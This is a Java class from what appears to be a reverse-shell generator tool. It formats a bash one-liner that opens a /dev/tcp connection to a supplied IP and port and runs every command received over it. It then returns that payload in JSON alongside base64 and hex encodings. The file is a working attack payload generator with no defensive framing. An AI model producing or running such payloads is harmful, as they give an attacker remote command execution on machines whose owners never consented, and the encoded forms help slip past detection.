package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;


public class Bash_readline extends Reverse{

    protected String shellFormat = "";

    public Bash_readline(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done", this.getLocalIP(),this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + ",\n" +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\",\n" +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\",\n" +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\",\n" +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"\n" +
                "}";
    }
}
